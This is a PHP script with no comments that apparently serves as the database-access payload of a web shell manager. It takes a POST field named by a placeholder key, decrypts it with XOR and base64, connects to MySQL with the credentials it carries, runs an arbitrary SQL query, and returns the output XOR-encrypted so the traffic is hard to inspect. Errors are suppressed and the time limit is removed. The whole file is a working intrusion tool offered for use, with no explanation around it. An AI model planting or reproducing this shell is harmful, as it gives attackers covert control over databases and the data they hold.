<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
$key = "{KeyString}";

function output($key) {
    $output = ob_get_contents();
    ob_end_clean();
    echo @base64_xor_encrypt($output,$key);
}
function base64_xor_encrypt($str,$key){
    $num = 0;
    $post = $str;
    for($i=0;$i<strlen($post);$i++) {
        if($num >= strlen($key)) $num = $num % strlen($key);
        $post[$i] = $post[$i]^$key[$num];
        $num += 1;
    }
    return base64_encode($post);
}

function base64_xor_derypt($str,$key){
    $num = 0;
    $post = base64_decode($str);
    for($i=0;$i<strlen($post);$i++) {
        if($num >= strlen($key)) $num = $num % strlen($key);
        $post[$i] = $post[$i]^$key[$num];
        $num += 1;
    }
    return $post;
}

ob_start();
try {
	if(!empty($_POST[$key])){
		$m = get_magic_quotes_gpc();
		$args = $m ? stripslashes(base64_xor_derypt($_POST[$key]),$key) : base64_xor_derypt($_POST[$key],$key);
		$arg = explode("|",$args);
		$hst = $arg[0];
		$usr = $arg[1];
		$pwd = $arg[2];
		$dbn = $arg[3];
		$sql = base64_decode($arg[4]);
		$T = @mysqli_connect($hst, $usr, $pwd);
		if (!$T) {
            echo ("ERROR://" . mysqli_connect_error());
        }
		@mysqli_select_db($T,$dbn);
		$q = @mysqli_query($T,$sql);
		if (is_bool($q)) {
			echo ($q ? "Status | True" : "ERROR://" . mysqli_error($T));
		} else {
			$i = 0;
			while ($col = @mysqli_fetch_field($q)) {
				$i++;
			}
			while ($rs = @mysqli_fetch_row($q)) {
				for ($c = 0;$c < $i;$c++) {
					echo (trim($rs[$c]));
				}
			}
		}
		@mysqli_close($T);
	}
}catch(Exception $e) {
    echo "ERROR://" . $e->getMessage();
}
output($key);
die();
